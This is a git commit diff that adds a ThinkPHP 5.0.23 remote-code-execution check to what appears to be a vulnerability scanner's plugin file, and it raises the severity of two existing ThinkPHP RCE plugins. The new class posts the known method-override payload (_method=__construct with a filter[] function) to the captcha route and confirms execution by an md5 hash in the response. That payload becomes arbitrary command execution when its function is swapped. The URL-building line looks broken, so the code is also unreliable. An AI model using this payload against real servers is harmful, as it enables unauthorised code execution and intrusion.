9491904e27f4031dfa2064ae43a602433632d0e9
ydhcui <664284092@QQ.COM>
2019-01-11 16:54:38 +0800

    upload thinkv5 rce poc

--- payloads/thinkphp.py
+++ payloads/thinkphp.py
@@ -7,7 +7,7 @@ from core.plugin import BaseWebPlugin,BaseHostPlugin
 
 class thinkphp_v21_rce(BaseWebPlugin):
     bugname = "thinkphpv2.1远程代码执行漏洞"
-    bugrank = "高危"
+    bugrank = "紧急"
 
     def filter(self,web):
         return 'thinkphp' in web.content or 'thinkphp' in web.xpoweredby
@@ -26,7 +26,7 @@ class thinkphp_v21_rce(BaseWebPlugin):
 
 class thinkphp_v5_rce(BaseWebPlugin):
     bugname = "thinkphpv5远程代码执行漏洞"
-    bugrank = "高危"
+    bugrank = "紧急"
 
     def filter(self,web):
         return 'thinkphp' in web.content or 'thinkphp' in web.xpoweredby
@@ -42,3 +42,32 @@ class thinkphp_v5_rce(BaseWebPlugin):
                 return True
         except Exception as e:
             print(e)
+
+class thinkphp_v5023_rce(BaseWebPlugin):
+    bugname = "thinkphpv5023远程代码执行漏洞"
+    bugrank = "紧急"
+
+    def filter(self,web):
+        return 'thinkphp' in web.content
+
+    def verify(self,web, user='', pwd='',timeout=10):
+        try:
+            url = '/'.join(web.url.split('/')[2]) + "/public/index.php?s=captcha"
+            data = {
+                '_method':'__construct',
+                'filter[]':'md5',
+                'method':'get',
+                'server[REQUEST_METHOD]':'666'
+            }
+            response = requests.post(url,data).text
+            if "fae0b27c451c728867a567e8c1bb4e53" in response:
+                self.bugaddr = url
+                self.bugreq = "url:%s \ndata:%s"%(url,data)
+                self.bugres = response
+                return True
+        except Exception as e:
+            print(e)
+
+
+
+
